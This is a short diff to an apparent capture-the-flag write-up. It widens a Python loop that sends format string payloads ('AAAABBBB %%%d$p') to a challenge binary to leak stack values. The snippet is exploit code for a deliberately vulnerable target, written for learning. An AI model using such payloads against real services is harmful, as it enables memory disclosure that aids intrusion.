@@ -116,7 +116,7 @@ I proceeded to print the stack values using the format string vulnerability of `
 
 Python script:
 ```
-for i in range(21):
+for i in range(26):
     r.sendlineafter(">", b"5")
     r.sendline("AAAABBBB %%%d$p" % i)
     r.recvuntil("a ")
